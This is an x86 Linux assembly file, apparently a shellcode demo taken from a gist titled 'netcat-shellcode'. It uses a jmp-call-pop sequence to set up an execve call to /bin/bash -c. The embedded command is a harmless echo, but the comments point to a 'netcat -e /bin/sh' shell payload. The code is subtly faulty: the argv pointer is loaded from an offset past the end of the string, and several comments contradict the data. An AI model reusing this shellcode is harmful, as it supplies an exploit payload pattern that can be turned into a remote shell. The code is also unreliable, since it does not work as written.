; this demo is from https://gist.githubusercontent.com/Morgawr/9852347/raw/37fafdbfab6684d4fb374c826a2c1bc628cbe2b0/netcat-shellcode.asm
; :set ft=masm - handy for intel highlighting in Vim

jmp short       forward

back:
pop             esi
xor             eax, eax

; store stuff
mov byte        [esi + 9], al     ; terminate /bin/bash
mov byte        [esi + 12], al    ; terminate -c
mov byte        [esi + 29], al    ; terminate /bin/shi -i ... 

mov long        [esi + 30], esi   ; address of /bin/bash in AAAA
lea             ebx, [esi + 9]   ; get address of -c  
mov long        [esi + 34], ebx   ; store address of -c in BBBB 
lea             ebx, [esi + 12]   ; get address of /bin/bash -i ... 
mov long        [esi + 38], ebx   ; store address of /bin/bash -i ... in CCCC
mov long        [esi + 42], eax   ; put NULL in DDDD

mov byte        al, 0x0b          ; pass the execve syscall number as argument
mov             ebx, esi          
lea             ecx, [esi + 66]   ; /bin/netcat -e /bin/sh etc etc
lea             edx, [esi + 42]   ; NULL
int             0x80              ; Run the execve syscall

forward:
call            back
db "/bin/bash#-c#echo how are you#AAAABBBBCCCCDDDD"
